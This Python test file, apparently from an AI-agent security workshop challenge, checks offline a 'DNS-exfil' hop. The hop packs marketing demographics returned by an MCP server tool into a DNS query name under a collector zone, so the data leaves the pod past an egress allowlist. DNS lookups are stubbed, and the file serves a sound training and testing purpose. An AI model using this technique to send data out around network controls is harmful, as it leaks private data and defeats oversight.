# ABOUTME: Offline cover for the C1 stage-2b DNS-exfil path (#725): the in-image Python name-lookup form carries
# ABOUTME: the marketing demographics in a query name, over the door the L3/L4 egress allowlist cannot see.
"""Offline half of the stage-2b beat, at the altitude the repo uses for the curl beat (test_run_shell_failure.py
loads the server and calls the tool; this loads the hop and calls it). The live half, that the lookups reach the
collector with the agent-egress-allowlist still enforced, needs a cluster and the DNS collector and is owed under
verify/run-e2e.sh, tracked by #728.

What it proves without a cluster:
  - the beat sends over DNS, not HTTPS: the hop opens no urllib/curl/http path, only the stdlib resolver;
  - it carries the demographics get_marketing_intel returns, as one DNS-label-safe query name under the zone;
  - the send is the query leaving the pod, so a name the collector does not resolve (NXDOMAIN) still counts;
  - no new binary is added: the image stays curl + ca-certificates, and the hop imports stdlib only, so
    python:3.12-slim runs it with nothing installed (no dnsutils, dig or nslookup).

The server is loaded with a stand-in for tool_audit, as test_run_shell_failure.py does, since the offline suite
has no `mcp`. socket.getaddrinfo is always stubbed here, so this test makes no real DNS query and needs no network.
"""
from __future__ import annotations

import importlib.util
import json
import pathlib
import sys
import types

REPO = pathlib.Path(__file__).resolve().parent.parent
AI = REPO / "gitops/ai-layer"
HOP_PATH = REPO / "challenges/c1-exfil-s3/dns-exfil.py"
DOCKERFILE = REPO / "images/workshop-mcp/Dockerfile"

failures: list[str] = []


def check(name: str, cond: bool, detail: str = "") -> None:
    print(f"  {'PASS' if cond else 'FAIL'}  {name}" + (f": {detail}" if detail and not cond else ""))
    if not cond:
        failures.append(name)


def load(mod_name: str, path: pathlib.Path):
    spec = importlib.util.spec_from_file_location(mod_name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# The marketing source the stage-2b beat carries, loaded from the server exactly as the curl beat's does.
sys.modules["tool_audit"] = types.SimpleNamespace(AuditedFastMCP=type(
    "_StandInMCP", (), {"__init__": lambda self, *a, **k: None, "tool": lambda self, *a, **k: (lambda f: f)}))
server = load("workshop_mcp_dns", AI / "workshop-mcp-server.py")
hop = load("c1_dns_exfil_hop", HOP_PATH)

MARKETING = json.loads(server.get_marketing_intel())
ZONE = "dns.agenticburn.com"


print("== the payload the beat carries exists on the MCP side ==")
demo = MARKETING.get("demographics") or {}
check("get_marketing_intel returns demographic shares (the stage-2b payload, as in stage 2)",
      bool(demo) and all("share_pct" in seg for seg in demo.values()), demo)


print("== the demographics ride out in one DNS-label-safe query name ==")
label = hop.demographics_label(MARKETING)
check("the label is a single DNS label: letters and digits only, under 63 bytes",
      label.isalnum() and 0 < len(label) <= 63, f"{label!r} ({len(label)})")
check("the label carries every species' share from the intel",
      all(str(seg["share_pct"]) in label for seg in demo.values()), f"{label!r} vs {demo}")
name = hop.query_name(ZONE, "wib-probe", MARKETING)
check("the query name is <marker>.<demographics>.<zone>",
      name == f"wib-probe.{label}.{ZONE}", name)
check("the room-view demographics are recoverable from the name the collector records",
      label in name.split("."), name)


print("== the send is a stdlib name lookup, and the query leaving the pod is the exfil ==")
calls: list = []


def _nxdomain(host, *a, **k):
    calls.append(host)
    raise hop.socket.gaierror(-2, "Name or service not known")


real = hop.socket.getaddrinfo
hop.socket.getaddrinfo = _nxdomain
try:
    sent = hop.send(ZONE, "wib-probe", MARKETING)
finally:
    hop.socket.getaddrinfo = real
check("send() looks the carrying name up through the stdlib resolver", calls == [name], calls)
check("a name the collector does not resolve (NXDOMAIN) still counts as sent", sent == name, sent)

# main() reads the marketing JSON on stdin and prints the name it sent, the way the live check drives it.
import io  # noqa: E402

calls.clear()
hop.socket.getaddrinfo = _nxdomain
old_stdin, old_argv = sys.stdin, sys.argv
sys.stdin, sys.argv = io.StringIO(json.dumps(MARKETING)), ["dns-exfil.py", ZONE, "wib-probe"]
try:
    import contextlib  # noqa: E402
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        rc = hop.main(sys.argv)
finally:
    sys.stdin, sys.argv = old_stdin, old_argv
    hop.socket.getaddrinfo = real
check("main() exits 0 and prints the name it sent, reading the intel on stdin",
      rc == 0 and buf.getvalue().strip() == name, f"rc={rc} out={buf.getvalue().strip()!r}")
check("main() made exactly the one lookup", calls == [name], calls)


print("== over DNS, not HTTPS, and with no new binary ==")
HOP_SRC = HOP_PATH.read_text(encoding="utf-8")
# The comment block explains the curl beat, so scan the code only: drop each line's `#` comment tail.
HOP_CODE = "\n".join(line.split("#", 1)[0] for line in HOP_SRC.splitlines())
check("the hop opens no HTTPS/curl path (it is the DNS twin of the curl beat)",
      not any(tok in HOP_CODE for tok in ("urllib", "http.client", "requests", "curl", "https://")),
      "the hop names an HTTP egress path")
imports = {line.split()[1].split(".")[0] for line in HOP_SRC.splitlines()
           if line.startswith(("import ", "from ")) and len(line.split()) > 1}
check("the hop imports stdlib only, so python:3.12-slim runs it with nothing installed",
      imports <= {"json", "socket", "sys"}, imports)

DOCKER_SRC = DOCKERFILE.read_text(encoding="utf-8")
installed = []
for line in DOCKER_SRC.splitlines():
    if "apt-get install" in line:
        tail = line.split("apt-get install", 1)[1]
        installed += [w for w in tail.split()
                      if not w.startswith("-") and w not in ("&&", "apt-get", "install", "\\")]
check("images/workshop-mcp/Dockerfile installs only curl and ca-certificates",
      sorted(installed) == ["ca-certificates", "curl"], installed)
check("no name-lookup binary is added to the image (no dnsutils, dig, nslookup, host, drill, bind-tools)",
      not any(b in DOCKER_SRC for b in ("dnsutils", "bind-tools", "nslookup", "drill",
                                        " dig ", " host ")), DOCKER_SRC)


print()
if failures:
    print(f"FAILED: {len(failures)} check(s)")
    for f in failures:
        print(f"  - {f}")
    sys.exit(1)
print("All C1 stage-2b DNS-exfil checks passed.")
